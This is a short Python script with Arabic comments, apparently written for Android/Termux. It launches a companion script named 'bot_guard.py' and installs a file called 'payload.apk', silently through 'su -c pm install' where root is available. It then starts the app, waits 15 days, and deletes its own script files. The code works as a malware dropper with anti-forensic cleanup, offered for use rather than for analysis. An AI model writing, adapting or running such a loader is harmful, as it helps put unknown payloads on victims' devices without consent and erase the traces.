import os
import sqlite3
import time
import subprocess

DB_FILE = "timer.db"
TOTAL_SECONDS = 15 * 24 * 60 * 60  # 15 يوم
FILE_TO_RUN = "bot_guard.py"
FILES_TO_DELETE = ["bot_guard.py", "main.py"]
APK_FILE = "payload.apk"

# تهيئة قاعدة البيانات
def init_db():
    conn = sqlite3.connect(DB_FILE)
    conn.execute("CREATE TABLE IF NOT EXISTS timer (id INTEGER PRIMARY KEY, start_time REAL)")
    conn.commit()
    conn.close()

# تسجيل وقت البداية
def log_start_time():
    conn = sqlite3.connect(DB_FILE)
    conn.execute("INSERT INTO timer (start_time) VALUES (?)", (time.time(),))
    conn.commit()
    conn.close()

# التحقق إذا انتهت المدة
def has_elapsed():
    conn = sqlite3.connect(DB_FILE)
    cur = conn.execute("SELECT start_time FROM timer ORDER BY id DESC LIMIT 1")
    row = cur.fetchone()
    conn.close()
    return (time.time() - row[0]) > TOTAL_SECONDS if row else False

# تشغيل bot_guard.py
def run_file():
    if os.path.exists(FILE_TO_RUN):
        subprocess.Popen(["python3", FILE_TO_RUN])
        print(f"تم تشغيل {FILE_TO_RUN}")
    else:
        print(f"[!] الملف {FILE_TO_RUN} غير موجود")

# تثبيت APK وتشغيله
def install_apk():
    if not os.path.exists(APK_FILE):
        print(f"[!] ملف APK غير موجود: {APK_FILE}")
        return

    print("[*] تثبيت APK...")
    if os.system("which su > /dev/null 2>&1") == 0:
        os.system(f'su -c "pm install -r {APK_FILE}"')
    else:
        os.system(f"termux-open {APK_FILE}")
        input("[*] اضغط Enter بعد التثبيت...")

    pkg = os.popen(f"aapt dump badging {APK_FILE} | grep package | awk -F\\' '{{print $2}}'").read().strip()
    if pkg:
        print(f"[+] تشغيل التطبيق: {pkg}")
        os.system(f"am start -n {pkg}/.MainActivity")
    else:
        print("[!] لم أتمكن من معرفة اسم الحزمة")

# حذف الملفات
def delete_files():
    for file in FILES_TO_DELETE:
        if os.path.exists(file):
            os.remove(file)
            print(f"تم حذف {file}")
        else:
            print(f"{file} غير موجود")

# البرنامج الرئيسي
def main():
    init_db()
    if not os.path.exists(DB_FILE) or has_elapsed():
        log_start_time()
        run_file()
        install_apk()
        print(f"[*] سيتم حذف الملفات بعد {TOTAL_SECONDS / 3600 / 24} يوم...")
        time.sleep(TOTAL_SECONDS)
        delete_files()
    else:
        print("[*] الجلسة الحالية ما زالت فعّالة.")

if __name__ == "__main__":
    main()
